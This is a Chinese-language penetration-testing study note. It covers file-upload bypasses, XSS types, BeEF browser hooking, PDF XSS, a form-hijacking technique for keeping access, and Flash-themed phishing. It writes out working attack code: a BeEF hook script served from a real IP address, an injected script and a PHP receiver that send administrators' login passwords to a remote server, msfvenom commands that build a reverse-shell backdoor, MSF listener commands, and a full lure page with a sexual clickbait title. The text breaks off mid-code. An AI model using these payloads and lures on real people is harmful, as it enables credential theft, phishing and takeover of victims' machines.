&lt;h4 id=&#34;漏洞寻找-审计技巧&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞寻找-审计技巧&#34;&gt;#&lt;/a&gt; 漏洞寻找 审计技巧&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;黑盒：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;黑盒寻找一切存在文件上传的功能应用 (看流程): 个人用户中心是否存在文件上传功能、后台管理系统是否存在文件上传功能、字典目录扫描探针文件上传构造地址、字典目录扫描探针编辑器目录构造地址。&lt;/p&gt;
&lt;p&gt;黑盒测试功能:&lt;br&gt;
 上传文件进行数据包拦截，尝试修改后缀、MIME 类型、后缀大小写、加点空格、 文件头部、.user.ini、.htaccess 等，如都失败了，可以抓取其他功能如重命名数据包看是 否能修改后缀、可以改 404 模板看是否允许修改、还可以先下载模板并写入木马后用后 台删除原有模板并重新加载带有木马的模板等。&lt;/p&gt;
&lt;p&gt;如果已经上传了 php 文件但是并没有被执行而是返回了 403，很有可能是目录做了 限制如.htaccess 的过滤，可以上传或重命名或移动到其他目录下尝试是否能被执行，还 可以直接删除.htaccess 文件消除此目录下的限制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;白盒：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;白盒看三点，中间件，编辑器，功能代码 (看代码): 中间件直接看语言环境常见搭 配编辑器、直接看目录机构或搜索关键字、功能代码直接看源码应用或搜索关键字。&lt;/p&gt;
&lt;p&gt;白盒调试代码:&lt;br&gt;
 一般调试代码是通过代码编辑器里边的调试按键或者直接打印某些不容易推断的变 量，也可以通过网站的审查元素功能确定当前的 url 及传参地址，还能通过 burp 抓取数 据包，直接就可以确定当前操作的 url 地址并且在代码中进行定位。&lt;/p&gt;
&lt;p&gt;根据 url 地址或者上传恶意文件时文件的报错锁定代码位置，追朔代码过滤规则及漏 洞产生的原因，在哪个地方过滤的，是黑白名单过滤还是过滤不严谨等。&lt;/p&gt;
&lt;h3 id=&#34;xss-跨站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss-跨站&#34;&gt;#&lt;/a&gt; xss 跨站&lt;/h3&gt;
&lt;h4 id=&#34;xss-原理分类及寻找&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss-原理分类及寻找&#34;&gt;#&lt;/a&gt; xss 原理分类及寻找&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;xss 跨站原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其 他用户造成影响的 HTML 代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执 行用户注入的脚本。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;xss 跨站分类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;反射型（非持久型）: 指执行一次的漏洞，不会存储到数据库中&lt;br&gt;
存储型（持久型）: 攻击代码写入到了数据库里，其他人访问时被攻击&lt;br&gt;
 DOM 型：数据的输入输出都是在浏览器 js 代码里边完成的，没有进入后端&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;xss 漏洞的寻找&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据交互的地方:get/post/headers，反馈与浏览，富文本编辑器，各类标签插入和自定义&lt;br&gt;
数据输出的地方：用户资料，关键词、标签、说明，文件上传&lt;/p&gt;
&lt;h4 id=&#34;beef-xss-安装及使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#beef-xss-安装及使用&#34;&gt;#&lt;/a&gt; beef-xss 安装及使用&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用docker在服务器安装，默认用户名密码都是beef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker pull janes/beef&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3docker run - p 3000:3000 - d janes/beef&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://110.42.178.227:3000/ui/panel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;本地写内容如下的 1 .html文件，当此页面被打开时，即beef上线&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script src=&amp;quot;http://110.42.178.227:3000/hook.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;beef观察到用户上线，可以在beef上盗取cookies，浏览器跳转，钓鱼等操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;将 hook 的指向代码放到自己的网站首页的内容里，同时引诱对方去访问自己的网站，当对方访问自己网站首页时，此时就会劫持到对方当前页面，可窃取 cookie; 但是毕竟是前 端代码造成的危害，js 代码可执行的操作很有限，需要诱使对方去下载木马拿主机权限&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;uxss-flashxss-pdfxss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#uxss-flashxss-pdfxss&#34;&gt;#&lt;/a&gt; uxss flashxss pdfxss&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;UXSS (通用型 xss): 利用浏览器或者浏览器扩展漏洞来制造产生 XSS 并执 行代码的一种攻击类型，CVE-2021-34506 Edge 低版本浏览器翻译功能导致 JS 语句被调用执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Flashxss:swf 引用 js 的 xss，swf 下载后利用 JPEXS Free Flash Decompiler 反编译审计，寻找 ExternalInterface.call 执行 JS 代码的地方。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PDFXSS: 上传后直链触发，创建 PDF 加入动作 JS、通过文件上传获取直链、直链地址通过浏览器访问后被触发，常用于钓鱼诱使对方下载 pdf 文件并 用 js 代码窃取相关凭据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# pdfxss的制作及应用场景&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;下载迅捷pdf编辑器-文件-新建文档-从空白页&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;视图-页面缩略图-右键缩略图属性-添加动作-新增运行js代码-app.alert(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后保存为1.pdf，后将pdf文件用浏览器打开即可触发js代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pdfxss上线beef的代码&amp;lt;script src=&amp;quot;http://110.42.178.227:3000/hook.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;不对，可能是需要其他的代码或者其他的手段才能窃取cookie&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;表单劫持实现维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#表单劫持实现维权&#34;&gt;#&lt;/a&gt; 表单劫持实现维权&lt;/h4&gt;
&lt;p&gt;前提是已经拿到了后台权限或者当前可以修改一些敏感文件；如 /login.php 登录后跳转到了 /admin/index.php 页面，可以修改后者，增加代码为上线 beef 或者 xss 平台窃取 cookie 的内容，则对方管理员在登录后就会将 cookie 发送到我们所设置的平台上。而若对方网站有同源策略或者防护的情况下，我们得到的 cookie 是不完整的，如丢失了 PHPSESSION，剩下的 cookie 部分不支持我们登入其后台。&lt;/p&gt;
&lt;p&gt;此时可以通过表单劫持来实现权限维持，通过抓包分析出网站在输入密码后会访问的网址如 /admin/login_check.php 页面，找到记录账户和密码的变量，将其发送到自己的远程服务器，$i=&lt;script src=&#34;http://x.x.x.x/get.php?user=account&amp;pass=passwd&#34;&gt;&lt;/script&gt;;echo $i，在自己的服务器上构造 get.php 文件用来接收 js 传过来的参数。于是乎，当对方每次登录后台的时候都会把最新的密码发送到自己的服务器上。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;服务器上的get.php的内容如下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;u=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;p=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;pass&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;myfile = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;newfile.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;a+&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;fwrite($&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;myfile, &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;fwrite($&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;myfile, &lt;span class=&#34;string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;fwrite($&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;myfile, &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;fclose($&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;myfile);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;浏览器网马配合 MSF 访问上线 (windows XP/windows 7):&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;先配置msfconsole生成URL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/browser/ms14_064_ole_code_execution&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set allowpowershellprompt true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set target 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;会生成一个url地址，诱使受害者访问此URL，一旦访问之后，msf就会上线拿到对方主机权限。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以先将 beef 代码放在自己的服务器上诱使对方访问恶意 url 地址，再通过 beef 的功能执行由 msf 生成的 url 进行上线。由于只适用于 XP/7 系统，在现在的网络环境上已经几乎碰不到了，但是钓鱼的思路还是很不错的。&lt;/p&gt;
&lt;h4 id=&#34;flash钓鱼及msf捆绑&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flash钓鱼及msf捆绑&#34;&gt;#&lt;/a&gt; Flash 钓鱼及 MSF 捆绑&lt;/h4&gt;
&lt;p&gt;参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGhlc3BhY2UvcC8xNTUyMDk0NS5odG1s&#34;&gt;https://www.cnblogs.com/thespace/p/15520945.html&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf 生成后门:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.16 8.0.102 LPORT=4444 -f exe -o ~/Desktop/flash.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载官方文件旧版 www.flash.cn 的钓鱼页,并下载 flash 的最新安装程序。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/r00tSe7en/Fake-flash.cn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载 winrar 解压缩工具，将 flash.exe 与 flash_install.exe 文件捆绑，选中之后-用 winrar 压缩-勾选自解压格式压缩文件-高级中的自解压选项-解压路径为 C:\windows\temp, 选择设置中解压前运行 flash.exe，解压后运行 flash_install.exe-重命名后保存。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;图标伪造，利用 Restorator 工具，将 flash 原有的图标导出为 ico，并且将用 rar 新生 成的 exe 的图标改为 flash 图标并保存后获得正确的图标。将此文件放入到外网地址中， 并用钓鱼页面的下载地址指向 flash_install.exe 的下载链接。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF配置监听状态&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;再次使用适当的语言诱使受害者点击，需要准备精心设计的 html 页面，并在点击图 片或者视频的时候会跳转到远程的 flash 下载界面，当用户点击下载 flash 并且执行后， 木马就会成功上线，msf 就会接收到对方主机的会话。钓鱼代码如下所示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html xmlns=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;title&amp;gt;小迪与某主播SESE画面流出！&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  小迪与某主播SESE画面流出！&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;img src=&amp;quot;1.jpg&amp;quot; alt=&amp;quot;&amp;quot; width=&amp;quot;300&amp;quot; height=600 align=&amp;quot;absmiddle&amp;quot;/ onclick=a()&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function a()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  alert( &amp;quot;您的FLASH版本过低，尝试升级后访问该页面! &amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  window.location.href=&amp;quot;http://192.168.0.111/&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;++ 实测中木马未做免杀被 Defender 拦截，且 rar 压缩出现了问题，并没有释放 exe 木马&lt;/p&gt;
&lt;h4 id=&#34;xss-常见绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss-常见绕过&#34;&gt;#&lt;/a&gt; XSS 常见绕过&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;window.location.href=&lt;span class=&#34;string&#34;&gt;&amp;#x27;https://www.baidu.com&amp;#x27;&lt;/span&gt; 指将当前页面跳转到百度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;document.cookie指获取当前页面的cookie的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta 